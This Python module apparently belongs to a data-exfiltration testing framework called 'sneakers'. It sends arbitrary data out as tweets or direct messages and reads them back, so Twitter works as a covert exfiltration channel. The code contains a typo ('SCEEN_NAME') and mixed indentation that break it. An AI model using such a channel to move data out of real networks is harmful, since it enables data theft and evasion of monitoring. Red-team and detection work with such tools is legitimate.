from sneakers.modules import Channel, Parameter
from sneakers.errors import ExfilChannel
from twython import Twython, TwythonError

class Twitter(Channel):
    info = {
        "name": "Twitter",
        "author": "Gabriel Butterick & Bonnie Ishiguro (davinerd minor changes)",
        "description": "Posts data to Twitter as a series of 140 character Tweets",
        "comments": []
    }

    params = {
        'sending': [
            Parameter('key', True, 'Application key for Twitter API.'),
            Parameter('secret', True, 'Application secret for Twitter API.'),
            Parameter('token', True, 'OAuth token for Twitter API.'),
            Parameter('tsecret', True, 'OAuth token secret for Twitter API.'),
            Parameter('name', True, 'Screen name of Twitter account to post data to.'),
	    Parameter('dm', False, 'Specify if communication has to be through DirectMessage')
        ],
        'receiving': [
            Parameter('key', True, 'Application key for Twitter API.'),
            Parameter('secret', True, 'Application secret for Twitter API.'),
            Parameter('token', True, 'OAuth token for Twitter API.'),
            Parameter('tsecret', True, 'OAuth token secret for Twitter API.'),
            Parameter('name', True, 'Screen name of Twitter account to post data to.'),
	    Parameter('dm', False, 'Specify if communication has to be through DirectMessage'),
	    Parameter('ids', False, 'Message IDs used in DirectMessage')
        ]
    }

    # Can only post 100 times per hour or 1000 times per day
    max_length = 140
    max_hourly = 100

    def send(self, data):
        dm_enable = self.param('sending', 'dm')

        APP_KEY = self.param('sending', 'key')
        APP_SECRET = self.param('sending', 'secret')
        OAUTH_TOKEN = self.param('sending', 'token')
        OAUTH_TOKEN_SECRET = self.param('sending', 'tsecret')
        SCREEN_NAME = self.param('sending', 'name')

        try:
            twitter = Twython(APP_KEY, APP_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET)

            if dm_enable:
                result = twitter.send_direct_message(screen_name=SCEEN_NAME, text=data)
            else:
                result = twitter.update_status(status=data)
        except Exception as err:
            raise ExfilChannel("Error sending tweets: {0}".format(err))

        return result['id_str']

    def receive(self):
        dm_enable = self.param('receiving', 'dm')
	ids = self.param('receiving', 'ids')
        tweets = list()
        user_timeline = list()

        APP_KEY = self.param('receiving', 'key')
        APP_SECRET = self.param('receiving', 'secret')
        OAUTH_TOKEN = self.param('receiving', 'token')
        OAUTH_TOKEN_SECRET = self.param('receiving', 'tsecret')
        SCREEN_NAME = self.param('receiving', 'name')

        twitter = Twython(APP_KEY, APP_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET)

        try:
            if dm_enable:
                if len(ids) > 0:
                    for dm_id in ids:
                        dm = twitter.get_direct_message(id=dm_id)
                        user_timeline.append(dm)
                else:
                    user_timeline = twitter.get_direct_messages()
            else:
                if len(ids) > 0:
                    for t_id in ids:
                        tweet = twitter.show_status({'id': t_id})
                        user_timeline.append(tweet)
                else:
                    user_timeline = twitter.get_user_timeline(screen_name=SCREEN_NAME)

            for x in user_timeline:
                if 'text' in x:
                    tweets.append(x['text'])

        except Exception as err:
            raise ExfilChannel("Error retrieving tweets: {0}".format(err))

        return tweets

